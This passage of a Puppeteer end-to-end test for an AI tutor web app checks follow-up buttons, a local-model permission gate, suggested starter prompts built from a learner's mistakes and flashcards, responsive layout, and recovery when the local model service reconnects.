    const simpler = calls.respond.at(-1).body;
    assert.equal(simpler.task, "explain", "Simpler did not use the Explain mode");
    assert.equal(simpler.webSearch, false, "a follow-up used the web");
    assert.match(simpler.prompt, /^Explain your previous answer more simply/);
    assert.deepEqual(simpler.history.map((message) => message.role), ["user", "assistant"], "a follow-up did not remember exactly the answer it follows");
    assert.equal(simpler.history[0].content, "Why does ridge regression shrink the weights?");
    assert.ok(simpler.history[1].content.length > 1_093 && simpler.history[1].content.length <= 3_000, `the followed answer was cut to ${simpler.history[1].content.length} characters`);
    assert.equal(/\[S\d+\]/.test(simpler.history[1].content), false, "the remembered answer kept another request's citation labels");
    assert.equal(simpler.conversationSummary, "", "a follow-up sent older conversation memory");
    assert.ok(contextTitles(simpler).includes(contextTitles(firstRequest)[0]), `the follow-up did not retrieve the answer's lesson: ${JSON.stringify(contextTitles(simpler))}`);
    assert.match(await page.$$eval(".ai-tutor__message--user .ai-tutor__user-prompt", (nodes) => nodes.at(-1).textContent), /^Explain your previous answer more simply/, "the follow-up was not shown as a visible question");
    assert.equal(await page.evaluate(() => document.activeElement?.dataset?.messageId === [...document.querySelectorAll(".ai-tutor__message--assistant")].at(-1)?.dataset.messageId), true, "focus did not move to the follow-up's answer");
    assert.deepEqual(await page.$$eval(".ai-tutor__message--assistant", (nodes) => nodes.map((node) => Boolean(node.querySelector(".ai-tutor__follow-ups")))), [false, true], "follow-ups stayed on an older answer");

    await clickByText(page, ".ai-tutor__follow-ups button", "Quiz me on this");
    await page.waitForSelector(".ai-tutor__message--assistant:last-of-type .ai-tutor__quiz", { timeout: 10_000 });
    await waitForAnswers(page, 3);
    const quizFollowUp = calls.respond.at(-1).body;
    assert.equal(quizFollowUp.task, "quiz");
    assert.equal(quizFollowUp.responseFormat, "structured");
    assert.equal(quizFollowUp.webSearch, false);
    assert.equal(quizFollowUp.history.length, 2, "Quiz me on this did not remember only the answer it follows");
    assert.deepEqual(await page.$$eval(".ai-tutor__follow-ups button", (nodes) => nodes.map((node) => node.textContent)), ["Harder quiz", "Explain the answers"], "a quiz did not offer its own follow-ups");

    // Without the local-model permission the chip's question waits in the
    // box, in its mode, with the reason; nothing is sent.
    await openOptions(page);
    await clickByText(page, ".tutor-sheet button", "Review again");
    await closeOptions(page);
    const sentBefore = calls.respond.length;
    await clickByText(page, ".ai-tutor__follow-ups button", "Harder quiz");
    await page.waitForFunction(() => document.activeElement === document.querySelector(".ai-tutor__composer textarea"), { timeout: 5_000 });
    assert.equal(calls.respond.length, sentBefore, "a follow-up was sent without the local-model permission");
    assert.match(await page.$eval(".ai-tutor__composer textarea", (field) => field.value), /^Create 2 harder multiple-choice questions/);
    assert.equal(await activeMode(page), "Quiz", "the waiting follow-up lost its mode");
    assert.match(await page.$eval(".ai-tutor__composer-notice", (node) => node.textContent), /in the question box\. Tick the local-model permission/);
  } finally {
    await followUpsScenario.context.close();
  }

  // Suggested starts (TFEAT-04): built from the learner's own data, never
  // naming the roadmap on a fresh profile. A tap sets the mode and the
  // question, focuses the box and sends nothing; a draft the learner wrote
  // is replaced only on request. Phones show four full-width rows, wider
  // screens six in two columns.
  const documents = Array.isArray(contentIndex) ? contentIndex : contentIndex.documents;
  const starterChapter = documents.find((document) => document.partNumber === 1 && !document.isIndex);
  const startersScenario = await newIsolatedPage("starters");
  try {
    const { page, calls } = startersScenario;
    const starterLabels = () => page.$$eval(".ai-tutor__starter", (nodes) => nodes.map((node) => [node.querySelector(".ai-tutor__starter-mode").textContent, node.querySelector(".ai-tutor__starter-title").textContent]));
    await page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
    await page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
    await page.waitForSelector(".ai-tutor__starter", { timeout: 5_000 });
    const freshStarters = await starterLabels();
    assert.ok(freshStarters.length >= 1 && freshStarters.length <= 4, `a fresh phone showed ${freshStarters.length} starters`);
    assert.equal(freshStarters.some(([, label]) => /roadmap|navigator|audit/i.test(label)), false, `a fresh profile's starters named the roadmap: ${JSON.stringify(freshStarters)}`);
    assert.deepEqual(freshStarters[0], ["Explain", `Explain the key ideas of ${starterChapter.title}`], "a fresh profile did not start from the first lesson in the plan");
    assert.equal(await page.$eval(".ai-tutor__starters", (node) => node.getAttribute("role") === "group" && document.getElementById(node.getAttribute("aria-labelledby"))?.textContent), "Suggested starts");

    const lapsedCard = { ...createReviewItem({ type: "basic", front: "What does the ridge penalty add to the loss?", back: "The squared L2 norm of the weights.", documentId: starterChapter.id, tags: [] }), lapses: 3 };
    await patchStoredProfile(page, {
      recent: [starterChapter.id],
      lastDocumentId: starterChapter.id,
      mistakes: [
        createMistake({ prompt: "Why does lasso produce sparse weights while ridge does not?", expected: "The L1 penalty has corners at zero.", documentId: starterChapter.id }),
        createMistake({ prompt: "What is leakage in cross-validation?", expected: "Preprocessing fitted on every fold.", documentId: "" }),
      ],
      reviewItems: [lapsedCard],
    });
    await page.reload({ waitUntil: "networkidle2", timeout: 30_000 });
    await page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
    await page.waitForFunction(() => document.querySelectorAll(".ai-tutor__starter").length === 4, { timeout: 5_000 });
    const seeded = await starterLabels();
    assert.deepEqual(seeded.map(([mode]) => mode), ["Explain", "Explain", "Quiz", "Explain"], `starter modes: ${JSON.stringify(seeded)}`);
    assert.equal(seeded[0][1], "I keep missing: Why does lasso produce sparse weights while ridge does not?", "the lesson's open mistake was not the first starter");
    assert.equal(seeded[1][1], "Help me remember: What does the ridge penalty add to the loss?", "the lapsed card was not offered");
    assert.match(seeded[2][1], /^Quiz me on /);
    assert.equal(seeded[3][1], `Explain the key ideas of ${starterChapter.title}`);
    const starterLayout = await page.evaluate(() => ({
      heights: [...document.querySelectorAll(".ai-tutor__starter")].map((node) => Math.round(node.getBoundingClientRect().height)),
      columns: new Set([...document.querySelectorAll(".ai-tutor__starter")].map((node) => Math.round(node.getBoundingClientRect().left))).size,
      scrollWidth: document.documentElement.scrollWidth,
      innerWidth,
    }));
    assert.equal(starterLayout.heights.every((height) => height >= 48), true, `starter rows under 48px: ${starterLayout.heights}`);
    assert.equal(starterLayout.columns, 1, "phone starters were not full-width rows");
    assert.equal(starterLayout.scrollWidth, starterLayout.innerWidth, "starters made the phone page scroll sideways");

    await clickByText(page, ".ai-tutor__starter", "I keep missing");
    await page.waitForFunction(() => document.activeElement === document.querySelector(".ai-tutor__composer textarea"), { timeout: 5_000 });
    assert.equal(await activeMode(page), "Explain");
    const mistakePrompt = await page.$eval(".ai-tutor__composer textarea", (field) => field.value);
    assert.match(mistakePrompt, /“Why does lasso produce sparse weights while ridge does not\?”\. The correct answer is: “The L1 penalty has corners at zero\.”/);
    await clickByText(page, ".ai-tutor__starter", "Quiz me on");
    assert.equal(await activeMode(page), "Quiz", "a quiz starter did not switch the mode");
    assert.equal(await page.$(".ai-tutor__starter-confirm"), null, "replacing one starter with another asked about a draft");
    assert.equal(calls.respond.length, 0, "a starter sent a request");

    await setComposerPrompt(page, "My own question about ridge penalties");
    await clickByText(page, ".ai-tutor__starter", "Explain the key ideas");
    await page.waitForSelector(".ai-tutor__starter-confirm", { timeout: 5_000 });
    assert.equal(await page.evaluate(() => document.activeElement?.textContent), "Keep my draft", "the draft question did not offer the safe choice first");
    await clickByText(page, ".ai-tutor__starter-confirm button", "Keep my draft");
    assert.equal(await page.$eval(".ai-tutor__composer textarea", (field) => field.value), "My own question about ridge penalties", "Keep my draft replaced the draft");
    assert.equal(await page.$(".ai-tutor__starter-confirm"), null);
    await clickByText(page, ".ai-tutor__starter", "Explain the key ideas");
    await page.waitForSelector(".ai-tutor__starter-confirm", { timeout: 5_000 });
    await clickByText(page, ".ai-tutor__starter-confirm button", "Replace draft");
    assert.equal(await page.$eval(".ai-tutor__composer textarea", (field) => field.value), `Explain the key ideas of the lesson “${starterChapter.title}” with a short example and one common mistake.`);
    assert.equal(await activeMode(page), "Explain");
    assert.equal(calls.respond.length, 0, "choosing starters sent a request");
    await page.$eval(sendSelector, (button) => button.click());
    await waitForAnswers(page, 1);
    assert.ok(String(calls.respond[0].body.context).includes(starterChapter.title), "the starter's lesson was not retrieved for it");
    assert.equal(await page.$(".ai-tutor__starters"), null, "starters stayed after the conversation began");

    // Clearing the conversation brings the starters back; wider screens
    // show six in two columns.
    await page.$eval('[aria-label="Clear AI tutor conversation"]', (button) => button.click());
    await clickByText(page, ".tutor-dialog button", "Clear conversation");
    await page.waitForSelector(".ai-tutor__starter", { timeout: 5_000 });
    await page.setViewport({ width: 1280, height: 800, deviceScaleFactor: 1 });
    await page.waitForFunction(() => document.querySelectorAll(".ai-tutor__starter").length === 6, { timeout: 5_000 });
    assert.equal(await page.evaluate(() => new Set([...document.querySelectorAll(".ai-tutor__starter")].map((node) => Math.round(node.getBoundingClientRect().left))).size), 2, "desktop starters were not in two columns");
  } finally {
    await startersScenario.context.close();
  }

  let modelOnline = false;
  const recovery = await newAuditPage("service-recovers", () => modelOnline ? secureConfig : {
    ...secureConfig, service: { ...secureConfig.service, reachable: false },
  }, { responseDelayMs: 1_500 });
  await recovery.page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2" });
  await recovery.page.waitForSelector(".ai-tutor__connection--error");
  modelOnline = true;
  await recovery.page.waitForSelector(".ai-tutor__connection--ready", { timeout: 16_000 });
  assert.ok(recovery.calls.config.length >= 2, "Ollama recovery did not automatically refresh the stale configuration");
  assert.equal(await recovery.page.$(".ai-tutor__privacy-body"), null, "a returning learner sees repeated disclosure text");
  await recovery.page.$eval(".ai-tutor__composer textarea", (field) => {
    Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set.call(field, "Explain test leakage briefly.");
    field.dispatchEvent(new Event("input", { bubbles: true }));
  });
  if (await recovery.page.$(".ai-tutor__consent input")) await recovery.page.click(".ai-tutor__consent input");
  await recovery.page.locator(sendSelector).click();
  await recovery.page.waitForSelector(".ai-tutor__message--streaming");
  assert.equal(await recovery.page.$$eval("[data-ai-engine-option]", (nodes) => nodes.every((node) => node.disabled)), true, "Mac generation did not lock the engine picker");
  await recovery.page.$eval('[data-ai-engine-option="phone-local"]', (button) => button.click());
  assert.equal(await recovery.page.$eval(".ai-learning-studio", (node) => node.dataset.aiEngine), "mac-local");
  await recovery.page.waitForSelector(".ai-tutor__message--streaming", { hidden: true });
  assert.equal(recovery.calls.respond.length, 1, "engine controls interrupted or duplicated the request");
  assert.equal(await recovery.page.$$eval("[data-ai-engine-option]", (nodes) => nodes.every((node) => !node.disabled)), true);
  await recovery.page.close();

  assert.deepEqual(runtimeErrors, [], `runtime errors: ${runtimeErrors.join(" | ")}`);
  console.log("AI UI audit passed: canonical fitted request bytes, request-contract handshake and version-skew fail-closed guidance, thinking-gated Deep profile, learner pairing gate with typed rejection, remembered local disclosure, one-request web authorization/retry, visible web states, sanitized evidence links, grounded citations including the exact personal-note deep link, model-authored HTML shown as text with no forged citation control, remote images shown as links that load nothing, same-host links as text, the saved answer and AI flashcards inert in the Notebook, the review dialog preview and the review deck, validated quiz, answer-to-note clipping, bounded persistence/clear, single-tab history integrity, tutor lifecycle, keyboard focus and announcements, the docked composer at five viewports, the request options sheet, jump to latest and answer ready, keyboard sending and Esc stop, staged grounded progress, and fail-closed states verified without a real model or search call.");
} finally {
  await browser?.close();
  await rm(profileDirectory, { recursive: true, force: true });
}
